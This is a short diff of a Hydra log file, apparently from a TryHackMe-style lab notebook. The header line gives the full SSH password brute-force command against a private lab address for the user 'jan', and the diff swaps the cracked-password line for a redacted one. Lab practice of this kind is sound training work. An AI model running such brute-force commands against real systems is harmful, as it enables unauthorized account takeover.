@@ -1,2 +1,2 @@
 # Hydra v9.7 run at 2026-10-07 03:55:40 on 10.67.180.56 ssh (hydra -l jan -P /tmp/dirigida.txt -t 4 -f -o /home/valentin/TP_THM/bitacora/hydra_jan_dirigida.txt ssh://10.67.180.56)
-[22][ssh] host: 10.67.180.56   login: jan   password: armando
+[22][ssh] host: 10.67.180.56   login: jan   password: [REDACTED]
